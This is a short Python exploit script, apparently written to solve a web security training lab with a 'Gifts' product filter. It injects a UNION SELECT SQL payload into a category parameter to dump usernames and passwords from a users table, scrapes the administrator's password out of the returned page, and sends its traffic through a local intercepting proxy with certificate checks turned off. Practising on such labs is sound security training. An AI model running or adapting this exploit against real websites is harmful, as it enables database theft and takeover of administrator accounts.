import sys
import requests
import urllib3
from bs4 import BeautifulSoup as bs
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def contents(url):
    u = url + "filter?category=Gifts'%20union%20select%20username,password%20from%20users--%20-"
    r = requests.get(u, verify=False, proxies=proxies)
    if "administrator" in r.text:
        print("User administrator found!")
        soup = bs(r.text, 'html.parser')
        adm_pass = soup.body.find(string="administrator").findNext("td").text
        print("Admin pass: %s" % adm_pass)
        return True
    return False

def main():
    try:
        url = sys.argv[1]
        contents(url)
    except IndexError:
        print("Usage: %s <url>" % sys.argv[0])
        sys.exit(-1)

if __name__ == '__main__':
    main()
